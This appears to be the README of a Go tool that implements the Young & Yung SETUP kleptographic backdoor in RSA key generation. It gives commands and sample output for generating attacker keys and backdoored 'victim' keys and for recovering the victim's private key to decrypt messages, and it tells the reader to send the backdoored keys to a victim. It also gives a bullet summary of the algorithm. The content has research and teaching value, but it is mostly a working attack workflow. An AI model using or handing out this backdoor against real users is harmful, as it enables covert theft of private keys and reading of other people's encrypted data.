# RSA Backdoor Generator

This repo contains code to reproduce the Secretly Embedded Trapdoor with Universal Protection (SETUP) attack on RSA key generation proposed by Young & Yung, 1996. 
Considering the potential of this attack, never trust black box key generation systems. 

References: 
    - [Presentation of the algorithm](https://scl.engr.uconn.edu/courses/ece4451/yung.pdf) 
    - [Original full paper](https://www.researchgate.net/profile/Moti-Yung/publication/221348188_Kleptography_Using_Cryptography_Against_Cryptography/links/00b7d53b88cb0ca63f000000/Kleptography-Using-Cryptography-Against-Cryptography.pdf)

## Usage

Start by generating your attacker keys and then generate the backdoored keys. 

```
# build
go build generator.go
go build decryptor.go

# (option) generate your (legit) RSA keys
openssl genrsa -out attacker_priv.pem 2048
openssl rsa -in attacker_priv.pem -pubout -out attacker_pub.pem

# generate backdoored keys
./generator -pk attacker_pub.pem -sk attacker_priv.pem -o out

# output
[*] Loading attacker's keys...
[+] Attacker's key loaded (N bit length: 2048)
[*] Using bitsize: 512

[*] Generating SETUP RSA key pair...
[*] This may take a while...

[+] Successfully generated backdoored key pair:
[+]  p bit length: 256
[+]  q bit length: 2303
[+]  n bit length: 2559
[i]  Attempts needed: 339872

[+] Backdoored keys saved to:
[+]  Private key: out/victim_priv.pem
[+]  Public key:  out/victim_pub.pem
[*]  Metadata:    out/metadata.txt

[+] SETUP backdoored key pair generated successfully!

[i] To test encryption run:
  echo -n "hello world" | openssl pkeyutl -encrypt -inkey out/victim_pub.pem -pubin -out out/cipher.bin

[i] To test SETUP backdoor run:
  ./decryptor -pk out/victim_pub.pem -sk attacker_priv.pem -c out/cipher.bin

# Then send the backdoored keys generated in out/ to the victim
```

If the victim trusts the keys received (which look perfectly normal and function as expected) they will use it to encrypt some data, e.g.: 

```
# encrypt
echo -n "SuperSecretSh1tttttt" | openssl pkeyutl -encrypt -inkey out/victim_pub.pem -pubin -out out/cipher.bin

# verify
echo out/cipher.bin | base64

=> NDSvLhgN6Iix+t+ubGW/fe0brqaWNxuuS76QexxwPpgYxHLMmlGIYtGi7n6g8MjX84roJWuVt2Wg
t+5rfPO4lvQLPUf4ax994WpQMdeNqxJjh7zApk4i9waTbiksJb09z5W+1n8ZsffsDiyOvvAp3y7H
NZhtEYNL2ww3Na18TxChmQSy9DEDaxJAhlzkRVq9Pw6n8DmY5yJ1gOCNitPt/EmuB8WJl+DZy4Bq
fjdZX7ZKNibxVr/LjRGzkn2gyGDrUSUHHT4Ay4t5mKie9Zjbk3HPcm4hsEb04XBRLVxv0TydK13t
E5lBaJkB2xxrag2I1W6A1O1KYv07qmHH5qgOzJdFOIBGKh/2s27N/nCl1stgNESvgTHLd6rDrbif
N32Qq2KjGI3rcfrgYw+SBNm+VF4ML2ZBIfTv/7Xtm5s50do=
```

The twist is that the attacker can decrypt the message using the victim's public key and is own private key. E.g., 

```
# decrypt
./decryptor -pk out/victim_pub.pem -sk attacker_priv.pem -c out/cipher.bin

# output
[*] Loading victim's public key...
[*] Loading attacker's private key...
[*] Loading ciphertext...
[i] Auto-detected bitsize: 512
[*] Extracting private key from SETUP backdoor...
[+] Found valid factorization using s1
[+] Recovered p (bit length: 256)
[+] Recovered q (bit length: 2303)
[+] Recovered d (bit length: 2559)

[+] Successfully extracted victim's private key!

[*] Decrypting ciphertext...

--- DECRYPTED MESSAGE ---
��LV�����zFڟ%)�2rqC���e�n���e�y��Mw�rE'X��Bw�L6����+�H�>_��qI
���^������P2��
��/3O�1v7��.��O�E|\�~��i�z3m���^�lg̔n���ʏ�q��_/�T�*E��$�5���K����(�"�xfG������5�X#v�ɧ|zA�Ț��҂�C� ��c�vx��8�8T    �@����ݎ
�$�;�2��.�SuperSecretSh1tttttt                                                                                         �1Vtj��e4�@}��1唩F��V�dDX�
-------------------------
```


## How does it work ?

If you want the full details of this attack check the two links in the preamble. High-level overview of this attack is the following : 

Here is a concise bullet‑point synthesis of the described SETUP (kleptographic) attack on RSA key generation:

#### **Normal RSA Key Generation (Baseline)**

* Generate two large random primes **p** and **q** (≈1024 bits each for a 2048‑bit key).
* Compute **n = p · q**.
* Choose public exponent **e** (typically 2¹⁶+1).
* Compute **d** such that **e · d ≡ 1 mod φ(n)** with **φ(n) = (p–1)(q–1)**.
* Public key: **(n, e)**; Private key: **d**.
* Encryption: **c = mᵉ mod n**; Decryption: **m = cᵈ mod n**.

#### **Kleptographic (SETUP) RSA Key Generation**

* Choose a 1024‑bit prime **s** and compute **p = H(s)** (repeat until p is prime).
* Encrypt **s** with attacker’s key: **c = sᴱ mod N**.
* Pick random **z**.
* Construct **q** so that **c || z = p · q + r** for some arbitrary remainder **r**; retry if q is not prime.
* Compute **n = p · q**, set e normally, and compute **d** as in standard RSA.
* Output normal‑looking public key **(n, e)** and private key **d** — but with a hidden trapdoor.

#### **Attacker’s Recovery of the Victim’s Private Key**

* Take the top **n/2 bits** of **n** as **u** (≈1024 bits).
* Define **c₁ = u** and **c₂ = u + 1** (to handle possible bit loss in c||z embedding).
* Decrypt with attacker’s private key **D**:
  * **s₁ = c₁ᴰ mod N**, **s₂ = c₂ᴰ mod N**.
* Compute candidate primes:
  * **p₁ = H(s₁)**, **p₂ = H(s₂)**.
* Compute **q₁ = n / p₁** and **q₂ = n / p₂**; the division that yields an integer reveals the true **p** and **q**.
* Recompute **d** from (p, q, e).
* Attacker now fully recovers the victim’s RSA private key.

## Improvements

Currently the program uses ProbablyPrime() to check if a given n is prime. ProbablyPrime performs n Miller-Rabin tests to check whether x is prime. If it returns true, x is prime with probability 1 - 1/4^n. If it returns false, x is not prime. As such, there's a non-zero probability that the backdoor generation fails (Q can't be solved). Just rerun the tool if that's the case. 
